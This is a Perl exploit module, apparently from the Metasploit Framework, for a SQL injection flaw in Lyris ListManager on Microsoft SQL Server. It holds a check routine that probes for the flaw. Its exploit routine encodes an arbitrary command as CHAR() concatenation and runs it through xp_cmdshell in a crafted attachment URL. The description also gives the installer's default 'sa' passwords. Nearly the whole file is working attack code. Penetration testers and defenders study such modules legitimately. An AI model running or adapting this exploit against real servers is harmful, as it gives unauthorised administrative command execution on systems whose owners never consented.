
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::lyris_attachment_mssql;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'Lyris ListManager Attachment SQL Injection (MSSQL)',
	'Version'  => '$Revision: 1.2 $',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
	'Arch'  => [ ],
	'OS'    => [ 'win32' ],
	'Priv'  => 1,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
	  	'Space' => 1000,
		'Keys'  => ['cmd'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a SQL injection flaw in the Lyris ListManager
	software for Microsoft SQL Server. This flaw allows for arbitrary commands
	to be executed with administrative privileges by calling the xp_cmdshell
	stored procedure. Additionally, a window of opportunity is opened during the
	ListManager for MSDE install process; the 'sa' account is set to the password 'lminstall'
	for a 5-10 minute period. After the installer finishes, the password is
	permanently set to 'lyris' followed by the process ID of the installer (a 1-5 digit number).
}),

	'Refs'  =>
	  [
		['URL',   'http://metasploit.com/research/vulns/lyris_listmanager/'],
		['OSVDB', '21548'],
	  ],
	  
	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['No target needed.'],
	  ],

	'Keys' => ['lyris'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET /read/attachment/' HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

	my $r = $s->Recv(-1, 5);

	if ($r =~ /Unclosed quotation mark before/) {
		$self->PrintLine("[*] Vulnerable installation detected ;)");
		return $self->CheckCode('Detected');
	}
	
	if ($r =~ /SQL error reported from Lyris/) {
		$self->PrintLine("[*] Vulnerable installation, but not running MSSQL.");
		return $self->CheckCode('Safe');
	}
	
	if ($r =~ /ListManagerWeb.*Content-Length: 0/sm) {
		$self->PrintLine("[*] This system appears to be patched");
		return $self->CheckCode('Safe');	
	}
	
	$self->PrintLine("[*] Unknown response, patched or invalid target.");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');

	my $cmd = $self->GetVar('EncodedPayload')->RawPayload;

	my $sql = 
		'DECLARE @X NVARCHAR(4000);'.
		'SET @X= ';

	foreach my $c (unpack('C*', $cmd)) {
		$sql .= "CHAR($c) + ";
	}
	$sql .= "'\x20';";
	$sql .= 'EXEC MASTER..XP_CMDSHELL @X';

	my $url = "/read/attachment/1;".$self->URLEncode($sql).";--";


	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	$s->Recv(-1, 10);
	$self->Handler($s);
	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

1;

